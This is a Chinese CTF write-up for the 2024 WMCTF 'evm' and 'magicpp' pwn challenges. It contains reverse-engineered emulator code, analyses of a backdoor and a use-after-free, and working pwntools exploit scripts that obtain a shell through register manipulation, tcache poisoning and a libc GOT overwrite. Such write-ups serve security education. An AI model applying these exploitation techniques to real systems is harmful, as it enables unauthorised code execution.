+define dso_local void @WMCTF_READ(i32 noundef %0) #0 {
+  %2 = alloca i32, align 4
+  store i32 %0, i32* %2, align 4
+  ret void
+}
+
+; Function Attrs: noinline nounwind optnone uwtable
+define dso_local void @WMCTF_MMAP(i32 noundef %0) #0 {
+  %2 = alloca i32, align 4
+  store i32 %0, i32* %2, align 4
+  ret void
+}
+
+; Function Attrs: noinline nounwind optnone uwtable
+define dso_local void @WMCTF_WRITE(i32 noundef %0) #0 {
+  %2 = alloca i32, align 4
+  store i32 %0, i32* %2, align 4
+  ret void
+}
+
+; Function Attrs: noinline nounwind optnone uwtable
+define dso_local void @func1(i8* noundef %0) #0 {
+  %2 = alloca i8*, align 8
+  store i8* %0, i8** %2, align 8
+  call void @WMCTF_MMAP(i32 noundef 30864)
+  %3 = load i8*, i8** @.addr, align 8
+  call void @WMCTF_OPEN(i8* noundef %3)
+  call void @WMCTF_READ(i32 noundef 26214)
+  %4 = load i32, i32* @GLOBAL_CONSTANT, align 4
+  call void @WMCTF_WRITE(i32 noundef %4)
+  ret void
+}
+
+; Function Attrs: noinline nounwind optnone uwtable
+define dso_local void @func2(i8* noundef %0) #0 {
+  %2 = alloca i8*, align 8
+  store i8* %0, i8** %2, align 8
+  %3 = load i8*, i8** @.addr, align 8
+  call void @func1(i8* noundef %3)
+  ret void
+}
+
+; Function Attrs: noinline nounwind optnone uwtable
+define dso_local void @func3(i8* noundef %0) #0 {
+  %2 = alloca i8*, align 8
+  store i8* %0, i8** %2, align 8
+  %3 = load i8*, i8** @.addr, align 8
+  call void @func2(i8* noundef %3)
+  ret void
+}
+
+; Function Attrs: noinline nounwind optnone uwtable
+define dso_local void @func4(i8* noundef %0) #0 {
+  %2 = alloca i8*, align 8
+  store i8* %0, i8** %2, align 8
+  %3 = load i8*, i8** @.addr, align 8
+  call void @func3(i8* noundef %3)
+  ret void
+}
+
+; Function Attrs: noinline nounwind optnone uwtable
+define dso_local void @func5(i8* noundef %0) #0 {
+  %2 = alloca i8*, align 8
+  %3 = alloca i8*, align 8
+  store i8* %0, i8** %2, align 8
+  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %3, align 8
+  %4 = load i8*, i8** %3, align 8
+  call void @func4(i8* noundef %4)
+  ret void
+}
+
+attributes #0 = { noinline nounwind optnone uwtable &quot;frame-pointer&quot;=&quot;all&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; }
+
+!llvm.module.flags = !{!0, !1, !2, !3, !4}
+!llvm.ident = !{!5}
+
+!0 = !{i32 1, !&quot;wchar_size&quot;, i32 4}
+!1 = !{i32 7, !&quot;PIC Level&quot;, i32 2}
+!2 = !{i32 7, !&quot;PIE Level&quot;, i32 2}
+!3 = !{i32 7, !&quot;uwtable&quot;, i32 1}
+!4 = !{i32 7, !&quot;frame-pointer&quot;, i32 2}
+!5 = !{!&quot;Ubuntu clang version 14.0.0-1ubuntu1.1&quot;}
+</code></pre>
+<h1 id="evm">evm</h1>
+<pre><code class="language-bash">    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<h2 id="byte1">BYTE1</h2>
+<p>服了，一直以为 BYTE1 是低字节，结果并不是</p>
+<p>在 IDA 中，可以逐步分析 <code>result = (BYTE1(code) &gt;&gt; 4) &amp; 7;</code> 这行代码的作用。假设 <code>code</code> 是整数类型变量，<code>BYTE1(code)</code> 是用于提取 <code>code</code> 第二个字节的宏或函数（从低位开始计数，最低字节为第 0 字节）。</p>
+<h3 id="分析步骤">分析步骤：</h3>
+<ol>
+<li><p><strong><code>BYTE1(code)</code></strong>:</p>
+<ul>
+<li><code>BYTE1(code)</code> 通常用于提取 <code>code</code> 的第二个字节（即从低位开始计数的第 1 字节）。例如，若 <code>code</code> 是 32 位整数，则 <code>BYTE1(code)</code> 提取 <code>code</code> 的第 8 至第 15 位这 8 个比特。</li>
+<li>具体实现可能是 <code>#define BYTE1(x) ((x &gt;&gt; 8) &amp; 0xFF)</code>，即将 <code>code</code> 右移 8 位，再取最低的 8 位。</li>
+</ul>
+</li>
+<li><p><strong><code>BYTE1(code) &gt;&gt; 4</code></strong>:</p>
+<ul>
+<li>这一步将提取出的第二个字节再右移 4 位，保留该字节的高 4 位，丢弃低 4 位。</li>
+</ul>
+</li>
+<li><p><strong><code>&amp; 7</code></strong>:</p>
+<ul>
+<li><code>7</code> 的二进制表示为 <code>00000111</code>，只保留最低 3 位。<code>&amp; 7</code> 将移位结果与 <code>7</code> 按位与，因此只保留结果的最低 3 位。</li>
+</ul>
+</li>
+</ol>
+<h3 id="总结">总结：</h3>
+<p><code>result = (BYTE1(code) &gt;&gt; 4) &amp; 7;</code> 这行代码的作用是：</p>
+<ul>
+<li>从 <code>code</code> 中提取第二个字节（第 8 至第 15 位）。</li>
+<li>将该字节右移 4 位，保留其高 4 位。</li>
+<li>再通过 <code>&amp; 7</code> 操作，只保留移位结果的最低 3 位。</li>
+</ul>
+<p>最终，<code>result</code> 的值是 <code>code</code> 第二个字节的高 4 位中的最低 3 位。这类操作通常用于从字节中提取特定位字段，可能用于解析某种编码格式或协议。</p>
+<h2 id="主要逆向分析">主要逆向分析</h2>
+<pre><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  struct emulator v4; // [rsp+0h] [rbp-140h] BYREF
+  unsigned __int64 v5; // [rsp+128h] [rbp-18h]
+
+  v5 = __readfsqword(0x28u);
+  setbuf();
+  init_emulator(&amp;v4);
+  run_emulator(&amp;v4);
+  dele_emulator(&amp;v4);
+  return 0LL;
+}
+int __fastcall init_emulator(struct emulator *a1)
+{
+  a1-&gt;chunk_1000_ptr_page_table_addr_array[1] = malloc(0x1000uLL);
+  a1-&gt;chunk_1000_ptr_page_table_addr_array[0] = malloc(0x1000uLL);
+  a1-&gt;chunk_200000_ptr = malloc(0x200000uLL);
+  a1-&gt;chunk_200_ptr = malloc(0x200uLL);
+  memset((void *)a1-&gt;chunk_200_ptr, 0, 0x200uLL);
+  return puts(&quot;emulator init&quot;);
+}
+
+unsigned __int64 __fastcall run_emulator(struct emulator *emula)
+{
+  int i; // [rsp+20h] [rbp-40h]
+  struct struct1 now_ptr; // [rsp+24h] [rbp-3Ch] BYREF
+  unsigned __int64 len; // [rsp+30h] [rbp-30h] BYREF
+  __int64 now; // [rsp+38h] [rbp-28h] BYREF
+  unsigned __int64 random_offset; // [rsp+40h] [rbp-20h]
+  void *page_elememnt_0; // [rsp+48h] [rbp-18h]
+  __int64 now_1; // [rsp+50h] [rbp-10h] BYREF
+  unsigned __int64 v9; // [rsp+58h] [rbp-8h]
+
+  v9 = __readfsqword(0x28u);
+  puts(&quot;A modern architecture emulator, maybe not standard&quot;);
+  *(_DWORD *)&amp;now_ptr.len[4] = 0;
+  len = 0LL;
+  now = std::chrono::_V2::system_clock::now((std::chrono::_V2::system_clock *)&quot;A modern architecture emulator, maybe not standard&quot;);
+  now_1 = sub_402A78(&amp;now);
+  *(_QWORD *)&amp;now_ptr.time = (unsigned int)sub_4029BC(&amp;now_1);
+  sub_402A8E(&amp;now, (unsigned int)now_ptr.time);
+  sub_402AB8((__int64)&amp;now_1, 0, 500u);
+  __isoc99_scanf(&quot;%d&quot;, now_ptr.len);
+  getchar();
+  if ( *(_QWORD *)now_ptr.len &gt; 0x1000uLL )
+    _Exit(1);
+  __isoc99_scanf(&quot;%d&quot;, &amp;len);
+  getchar();
+  if ( len &gt; 3 )
+    _Exit(1);
+  random_offset = (int)sub_402AE6(&amp;now_1, &amp;now);
+  random_offset = find_arg2_len_pos_and_fill_1_return_offset(emula, len + 1, random_offset);
+  set_page_table_element(emula, 1uLL, 0, 1LL, random_offset);
+  set_page_table_element(emula, len, 0, 6LL, random_offset + 1);
+  page_elememnt_0 = (void *)page_convert(emula, 0LL, 0, 1LL);
+  read(0, page_elememnt_0, *(size_t *)now_ptr.len);
+  __isoc99_scanf(&quot;%d&quot;, now_ptr.len);
+  getchar();
+  if ( *(_QWORD *)now_ptr.len &gt; 0x1000uLL )
+    _Exit(1);
+  __isoc99_scanf(&quot;%d&quot;, &amp;len);
+  getchar();
+  if ( len &gt; 3 )
+    _Exit(1);
+  random_offset = (int)sub_402AE6(&amp;now_1, &amp;now);
+  random_offset = find_arg2_len_pos_and_fill_1_return_offset(emula, len + 1, random_offset);// 找到可以的random_offset
+  set_page_table_element(emula, 1uLL, 1u, 1LL, random_offset);
+  set_page_table_element(emula, len, 1u, 6LL, random_offset + 1);
+  page_elememnt_0 = (void *)page_convert(emula, 0LL, 1u, 1LL);
+  read(0, page_elememnt_0, *(size_t *)now_ptr.len);
+  for ( i = 0; (unsigned __int64)i &lt; *(_QWORD *)now_ptr.len &gt;&gt; 2; ++i )
+  {
+    if ( *((_DWORD *)page_elememnt_0 + i) != 0x13 )
+      _Exit(1);
+  }
+  process_code_memory(emula, 0);
+  process_code_memory(emula, 1u);
+  clean_chunk_1000_ptr_page_table_addr_content(emula, 0);
+  clean_chunk_1000_ptr_page_table_addr_content(emula, 1u);
+  return v9 - __readfsqword(0x28u);
+}
+</code></pre>
+<h2 id="漏洞">漏洞</h2>
+<p>存在后门</p>
+<p>创建了两个一级页表，每个页表只有 1 个页表项，并且可以向页表项对应的内存写入输入</p>
+<p>必须先执行完第一个页表，才能触发后门。有 /bin/sh 的地址，未开启 PIE，且可以通过越界修改寄存器，将其改为后门所用的参数</p>
+<p>第二个页表的页表项输入受到限制，必须全部为 19；但可以利用通过第一个页表项输入的指令，修改第二个页表项对应的物理地址（宿主机虚拟地址）处的内容</p>
+<p>由于页表项对应物理地址的第 12 至第 21 位随机生成，需要向该物理地址的每一页都写入后门指令，才能同时修改第二个页表项对应物理地址处的指令</p>
+<p>2^9 &lt; 0x1000/4（可写入的指令数量）。发现还有一些其他的，不够用（可能是我优化不到位）</p>
+<p>本地能通，远程却一直失败。缩短 payload、增加爆破次数后可以成功，否则本来有机会拿三血。可惜最后还是晚了一点，<del>拿了四血</del></p>
+<h2 id="利用脚本-2">利用脚本</h2>
+<pre><code class="language-python">from pwn import *
+  
+def pwn():
+    p=remote(&quot;8.147.129.22&quot;,40300)
+    #p=process(&quot;./evm&quot;)
+    #   case 16:
+    #             dest = ((unsigned __int16)code &gt;&gt; 7) &amp; 0x1F;
+    #             src_1 = (code &gt;&gt; 15) &amp; 0x1F;
+    #             v8 = HIWORD(code) &gt;&gt; 4;
+    #             result = (BYTE1(code) &gt;&gt; 4) &amp; 7;
+    #             switch ( (BYTE1(code) &gt;&gt; 4) &amp; 7 )   // 寄存器和立即数操作的结果给寄存器
+    #             {
+    #               case 0:
+    #                 result = (__int64)emula;
+    #                 emula-&gt;reg[dest] = emula-&gt;reg[src_1] + v8;
+    #                 break;
+    #                case 1:
+                    # result = (__int64)emula;
+                    # emula-&gt;reg[dest] = emula-&gt;reg[src_1] &lt;&lt; (v8 &amp; 0x3F);
+                    # break;
+    #  reg0=0
+    #  reg0=reg0+1
+    #  reg2=reg0&lt;&lt;12
+    # reg2=reg2+0xff0
+
+    # case 44:                              // 寄存器赋值给寄存器作为偏移的物理地址
+    #             v16 = emula-&gt;reg[(code &gt;&gt; 15) &amp; 0x1F] + (((unsigned __int16)code &gt;&gt; 7) &amp; 0x1F) + 32 * (HIBYTE(code) &gt;&gt; 1);
+    #             v18 = emula-&gt;reg[(HIWORD(code) &gt;&gt; 4) &amp; 0x1F];
+    #             v21 = (_QWORD *)(emula-&gt;chunk_200000_ptr + v16);
+    #             if ( v16 &gt; 0x1FFFFF )
+    #               _Exit(1);
+    #             result = (BYTE1(code) &gt;&gt; 4) &amp; 7;
+    #             if ( (_DWORD)result == 3 )
+    #             {
+    #               result = emula-&gt;chunk_200000_ptr + v16;
+    #               *v21 = v18;
+    #             }
+    #
+    # reg1=0 
+    # reg1=reg1+0x73
+
+    # v16=reg0
+
+    # *(_QWORD *)(reg0+chunk_200000_ptr)=reg1
+    init_reg1=p32(19|(0x73&lt;&lt;20)|1&lt;&lt;7|1&lt;&lt;15 )+p32(19|(0x50&lt;&lt;20)|0&lt;&lt;7|0&lt;&lt;15 ) 
+    cover_payload=p32(19|(1&lt;&lt;20))+p32(19|(1&lt;&lt;12|2&lt;&lt;7|12&lt;&lt;20))
+    cover_payload=cover_payload+p32(19|2&lt;&lt;7|2&lt;&lt;15|0xff0&lt;&lt;20)+p32(47|3&lt;&lt;12|2&lt;&lt;15|1&lt;&lt;20)
+    cover_payload_all=b&quot;&quot;
+    for i in range(0x40):
+        cover_payload_all=cover_payload_all+cover_payload
+    execve_num=59
+    bin_sh=0x00000000004050
+
+    # case 0:
+    #                 result = (__int64)emula;
+    #                 emula-&gt;reg[dest] = emula-&gt;reg[src_1] + v8;
+    #                 break;
+    #  case 1:
+    #                 result = (__int64)emula;
+    #                 emula-&gt;reg[dest] = emula-&gt;reg[src_1] &lt;&lt; (v8 &amp; 0x3F);
+    #                 break;
+        # case 7:
+        #             result = (__int64)emula;
+        #             emula-&gt;reg[dest] = v8 &amp; emula-&gt;reg[src_1];
+        #             break;
+
+    # reg[10]=0&amp;reg[10]
+    # reg[11]=0&amp;reg[11]
+    # reg[10]=reg[10]+59
+    # reg[11]=reg[11]+405
+    # reg[11]=reg[11]&lt;&lt;12
+    # reg[11]=reg[11]+0xa0
+    
+    construct_arg=p32(19|7&lt;&lt;12|10&lt;&lt;7|10&lt;&lt;15) + p32(19|7&lt;&lt;12|11&lt;&lt;7|11&lt;&lt;15)
+    construct_arg=construct_arg+p32(19|10&lt;&lt;7|10&lt;&lt;15|59&lt;&lt;20)+p32(19|11&lt;&lt;7|11&lt;&lt;15|0x405&lt;&lt;20)
+    construct_arg=construct_arg+p32(19|1&lt;&lt;12|11&lt;&lt;7|11&lt;&lt;15|12&lt;&lt;20)+p32(19|11&lt;&lt;7|11&lt;&lt;15|0xa0&lt;&lt;20)
+
+    payload=init_reg1+cover_payload_all+construct_arg
+
+    # gdb.attach(p)
+    # pause()
+    context(os=&quot;linux&quot;,arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+    p.sendlineafter(b&quot;maybe not standard\n&quot;, str(len(payload)).encode())
+    p.sendline(str(0))
+    instruct=payload
+    p.send(instruct)   
+    p.sendline(str(4))
+    p.sendline(str(0))
+    instruct=p32(0x13)   # padding
+    p.send(instruct)
+    p.interactive()
+    
+    
+
+while(1):
+    pwn()
+</code></pre>
+<h1 id="magicpp">magicpp</h1>
+<p><a href="https://blog.iret.xyz/posts/those-magic-compiler-optimization/">乘法变成除法</a></p>
+<p><del>逆不出来……和强网杯那道一样，全靠猜</del> 
+<del>我傻了，可以逆，是之前有心理阴影了……</del> </p>
+<p>可以加载文件，因此直接加载 /proc/self/maps 泄露地址；book 从 1 开始</p>
+<p>可以通过 fuzz 找到。使用 Python fuzz 会出现 <code>malloc(): unsorted double linked list corrupted\</code>。先增加分支，如果发生崩溃，再缩减分支，直到无法继续缩减，排除对触发崩溃没有影响的操作，再改变 fuzz 的操作，直到追踪到具体原因</p>
+<pre><code class="language-c">if (__glibc_unlikely (bck-&gt;fd != victim)
+              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))
+            malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);
+</code></pre>
+<pre><code class="language-c">unsortedbin
+all [corrupted]
+FD: 0x5b1832653c40 ◂— 0x30 /* &#39;0&#39; */
+BK: 0x5b1832653c40 —▸ 0x73fea921ace0 (main_arena+96) ◂— 0x5b1832653c40
+</code></pre>
+<p>最后发现，无论插入的 size 多大，只要数量超过 48，就会出现上述问题</p>
+<p>发现不断向 vector 中 push 时，一旦超过容量，就会释放旧空间并分配更大的空间。如果释放的旧空间足够大，就会进入 unsortedbin，因此可以通过分配将其切分</p>
+<p>发现 unsortedbin 中的 fd 被修改，应该存在释放后编辑。继续查看修改发生的时间，发现是在旧空间释放进入 unsortedbin 之后被修改的。</p>
+<pre><code class="language-c">    first_book = (_QWORD *)get_index_chunk(&amp;vector, 0LL);
+    value_sum = add_book_and_return_sum(&amp;book);
+    *first_book = value_sum;
+</code></pre>
+<p>这里 <code>add_book_and_return_sum</code> 可能释放旧空间，此时 first_book 已经进入 unsortedbin。</p>
+<h2 id="利用脚本-3">利用脚本</h2>
+<p>/proc/self/maps 可以泄露地址，这里又可以修改 fd，而且有 delete 能释放 context chunk，因此直接改 tcache fd 即可。由于写入 fd 的是 0x719f8a1d5040（_rtld_global）与其他 value 值的和，尝试打栈时发现，随机化改变的不只是栈基址，还有内部偏移。</p>
+<p>应该可以打 IO 的 house of cat 或 exit，不过为了学点新东西，这里也可以打 libcgot。load 中会调用 libc 的 got 表里的函数。懒得把三种方法都写一遍</p>
+<pre><code class="language-python">from pwn import *
+import random
+context(os=&quot;linux&quot;,arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+
+def randinit(n):
+    return random.randint(1, n)
+
+def insert(value,book_name,book_size,book_context):
+    p.sendlineafter(b&quot;Enter your choice: &quot;,str(1))
+    p.sendlineafter(b&quot;Enter the value: &quot;,value )
+    p.sendlineafter(b&quot;Enter the book name: &quot;,book_name)
+    p.sendlineafter(b&quot;Enter the context size: &quot;,book_size)
+    p.sendlineafter(b&quot;Enter the context: &quot;,book_context)
+
+def delete(index):
+    p.sendlineafter(b&quot;Enter your choice: &quot;,str(2))
+    p.sendlineafter(b&quot;Enter the index: &quot;,index)
+
+def sort():
+    p.sendlineafter(b&quot;Enter your choice: &quot;,str(3))
+
+def load(filename):
+    p.sendlineafter(b&quot;Enter your choice: &quot;,str(4))
+    p.sendlineafter(b&quot;Enter the file name: &quot;,filename)
+
+def save(index):
+    p.sendlineafter(b&quot;Enter your choice: &quot;,str(5))
+    p.sendlineafter(b&quot;Enter the book idx: &quot;,index)
+  
+
+def show(index):
+    p.sendlineafter(b&quot;Enter your choice: &quot;,str(6))
+    p.sendlineafter(b&quot;Enter the book idx: &quot;,index)
+
+def exit():
+    p.sendlineafter(b&quot;Enter your choice: &quot;,str(7)) 
+
+
+
+
+p=process(&quot;./pwn&quot;)
+gdb.attach(p)
+pause()
+p.sendlineafter(&quot;Enter your name: &quot;,b&quot;llk&quot;)
+
+load(b&quot;/proc/self/maps&quot;)
+show(str(1))
+
+heappart=(p.recvuntil(b&quot; rw-p 00000000 00:00 0                          [heap]&quot;,drop=True)).decode(&#39;utf-8&#39;)
+libcpart=(p.recvuntil(b&quot; r--p 00000000 08:03 1311935                    /home/llk/Desktop/pwn/2024_WMCTF/magicpp_e4a2bf175f5943f40cd83921b9b43853/libc.so.6&quot;,drop=True)).decode(&#39;utf-8&#39;)
+ldpart=(p.recvuntil(b&quot; r--p 00000000 08:03 788592                     /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2&quot;,drop=True)).decode(&#39;utf-8&#39;)
+stackpart=(p.recvuntil(b&quot; rw-p 00000000 00:00 0                          [stack]&quot;,drop=True)).decode(&#39;utf-8&#39;)
+
+heap=int(heappart[-25:-13],16)
+libc=int(libcpart[-25:-13],16)
+stack=int(stackpart[-25:-13],16)
+ld=int(ldpart[-25:-13],16)
+print(f&quot;Heap Address: {hex(heap)}&quot;)
+print(f&quot;Libc Address: {hex(libc)}&quot;)
+print(f&quot;Stack Address: {hex(stack)}&quot;)
+print(f&quot;ld Address: {hex(ld)}&quot;)
+
+
+insert(str(0),str(1),str(0x3c0),str(1))
+delete(str(2))
+for i in range(21):
+    insert(str(0),str(1),str(1),str(1))
+
+payloa=(libc+0x000000000021A0A0)^((heap+0x11000)&gt;&gt;12) # dest
+insert(str(payloa),str(1),str(1),str(1))
+payload=-(0x3a040+ld)
+print(&quot;+++++++++++++++++&quot;+hex(payload))
+insert(str(payload),str(1),str(1),str(1))
+
+insert(str(1),str(1),str(0x3c0),str(1))
+pause()
+
+payload=p64(0x19a144+libc)+p64(0xC5BF8+libc)+p64(0x1a2140+libc)+p64(0x148303+libc)+p64(0x199700+libc)+p64(0x28170+libc)+p64(0x28180+libc)+p64(0x80520+libc)
+insert(str(1),str(1),str(0x3c0),payload) # write to dest
+
+# .text:000000000013B748                 mov     rsi, [rsp+30h]
+# .text:000000000013B74D                 mov     rdi, [rsp+18h]
+# .text:000000000013B752                 call    j_strcpy
+
+# .text:0000000000147F26                 mov     rdi, [rsp+8]
+# .text:0000000000147F2B                 mov     rsi, r12
+# .text:0000000000147F2E                 call    j_strcpy
+
+
+# .text:0000000000148303                 mov     rsi, [rsp+20h]
+# .text:0000000000148308                 mov     rdi, [rsp+8]
+# .text:000000000014830D                 call    j_strcpy
+
+# .text:0000000000153D61                 mov     rdi, [rsp+18h]
+# .text:0000000000153D66                 mov     rsi, rbp
+# .text:0000000000153D69                 call    j_strcpy
+
+# .text:00000000000C5BF8                 pop     rbx
+# .text:00000000000C5BF9                 pop     rbp
+# .text:00000000000C5BFA                 pop     r12
+# .text:00000000000C5BFC                 pop     r13
+# .text:00000000000C5BFE                 jmp     j_wmemset_0
+
+
+# .got.plt:000000000021A0A8 off_21A0A8      dq offset strcpy        ; DATA XREF: j_strcpy+4↑r
+# .got.plt:000000000021A0A8                                         ; Indirect relocation
+# .got.plt:000000000021A0B0 off_21A0B0      dq offset wcschr        ; DATA XREF: j_wcschr+4↑r
+# .got.plt:000000000021A0B0                                         ; Indirect relocation
+# .got.plt:000000000021A0B8 off_21A0B8      dq offset strchrnul     ; DATA XREF: j_strchrnul+4↑r
+# .got.plt:000000000021A0B8                                         ; Indirect relocation
+# .got.plt:000000000021A0C0 off_21A0C0      dq offset memrchr       ; DATA XREF: j_memrchr+4↑r
+# .got.plt:000000000021A0C0                                         ; Indirect relocation
+# .got.plt:000000000021A0C8 off_21A0C8      dq offset _dl_deallocate_tls
+# .got.plt:000000000021A0C8                                         ; DATA XREF: __dl_deallocate_tls+4↑r
+# .got.plt:000000000021A0D0 off_21A0D0      dq offset __tls_get_addr
+# .got.plt:000000000021A0D0                                         ; DATA XREF: ___tls_get_addr+4↑r
+# .got.plt:000000000021A0D8 off_21A0D8      dq offset wmemset     
+p.interactive()
+# file=open(&#39;fuzz.txt&#39;, &#39;w&#39;) 
+# p=process(&quot;./pwn&quot;)
+# gdb.attach(p)
+# pause()
+# p.sendlineafter(&quot;Enter your name: &quot;,b&quot;llk&quot;)
+# for i in range(0x1000):
+#     match randinit(1):
+#         case 1:
+#             size=randinit(0x1000)
+#             insert(b&quot;1&quot;,b&quot;1&quot;,str(1),b&quot;1&quot;)
+#             file.write(&quot;insert size&quot;+str(1)+&quot;\n&quot;)
+#             file.flush()
+#         case 2:
+#             index=randinit(0x100)
+#             delete(str(index))
+#             file.write(&quot;delete index &quot;+str(index)+&quot;\n&quot;)
+#             file.flush()
+#         case 3:
+#             sort()
+#             file.write(&quot;sort \n&quot;)
+#             file.flush()
+
+
+
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20SEKAI-CTF%20(nolibc%20speedpwn%20life_simulator_2)/"><span class="l">上一篇</span>2024 SEKAI-CTF (nolibc speedpwn life_simulator_2)</a><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/HITCON-CTF-2024-Quals-setjmp/"><span class="l">下一篇</span>HITCON-CTF-2024-Quals-setjmp</a></nav>
+  </main>
+  <aside class="toc"><div class="toc-h">目录</div><a class="d2" href="#线程栈">线程栈</a><a class="d2" href="#线程堆初始化与-mmap-相关分配">线程堆初始化与 mmap 相关分配</a><a class="d2" href="#思路">思路</a><a class="d2" href="#利用脚本">利用脚本</a><a class="d2" href="#模块函数与基本块">模块、函数与基本块</a><a class="d2" href="#逆向分析">逆向分析</a><a class="d2" href="#要点-1">要点 1</a><a class="d2" href="#要点-2">要点 2</a><a class="d2" href="#利用脚本-1">利用脚本</a><a class="d2" href="#byte1">BYTE1</a><a class="d3" href="#分析步骤">分析步骤：</a><a class="d3" href="#总结">总结：</a><a class="d2" href="#主要逆向分析">主要逆向分析</a><a class="d2" href="#漏洞">漏洞</a><a class="d2" href="#利用脚本-2">利用脚本</a><a class="d2" href="#利用脚本-3">利用脚本</a></aside>
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
